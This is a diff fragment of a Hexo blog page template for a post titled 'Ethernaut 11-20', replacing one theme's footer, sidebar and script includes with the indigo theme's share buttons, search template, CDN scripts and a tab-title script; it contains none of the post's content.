+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
 </footer>
 
-</main>
-<aside class="sidebar">
-  <button class="navbar-toggle"></button>
-<nav class="navbar">
-  
-    <div class="logo">
-      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
-    </div>
-  
-  <ul class="nav nav-main">
-    
-      <li class="nav-item">
-        <a class="nav-item-link" href="/">主页</a>
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/05/07/nqua9o/&title=《Ethernaut 11-20》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
       </li>
-    
-      <li class="nav-item">
-        <a class="nav-item-link" href="/archives">归档</a>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
       </li>
-    
-      <li class="nav-item">
-        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/05/07/nqua9o/&title=《Ethernaut 11-20》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
       </li>
-    
-      <li class="nav-item">
-        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/05/07/nqua9o/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
       </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link nav-item-search" title="Search">
-        <i class="fe fe-search"></i>
-        Search
-      </a>
-    </li>
-  </ul>
-</nav>
-<nav class="navbar navbar-bottom">
-  <ul class="nav">
-    <li class="nav-item">
-      <div class="totop" id="totop">
-  <i class="fe fe-rocket"></i>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Ethernaut 11-20》 — yichen's blog&url=https://yichen115.github.io/2020/05/07/nqua9o/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/05/07/nqua9o/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/05/07/nqua9o/" alt="微信分享二维码">
 </div>
-    </li>
-    <li class="nav-item">
-      
-    </li>
-  </ul>
-</nav>
-<div class="search-form-wrap">
-  <div class="local-search local-search-plugin">
-  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
-  <div id="local-search-result" class="local-search-result"></div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
 </div>
-</div>
-</aside>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
 
-<script src="/js/jquery-2.0.3.min.js"></script>
-
-
-<script src="/js/jquery.justifiedGallery.min.js"></script>
-
-
-<script src="/js/lazyload.min.js"></script>
-
-
-<script src="/js/busuanzi-2.3.pure.min.js"></script>
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
 
 
 
 
-  
-<script src="/js/tocbot.min.js"></script>
 
-  <script>
-    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
-    tocbot.init({
-      tocSelector: '.tocbot',
-      contentSelector: '.article-entry',
-      headingSelector: 'h1, h2, h3, h4, h5, h6',
-      hasInnerContainers: true,
-      scrollSmooth: true,
-      positionFixedSelector: '.tocbot',
-      positionFixedClass: 'is-position-fixed',
-      fixedSidebarOffset: 'auto',
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
     });
-  </script>
+})();
+</script>
 
-
-
-<script src="/js/ocean.js"></script>
 
 
 </body>
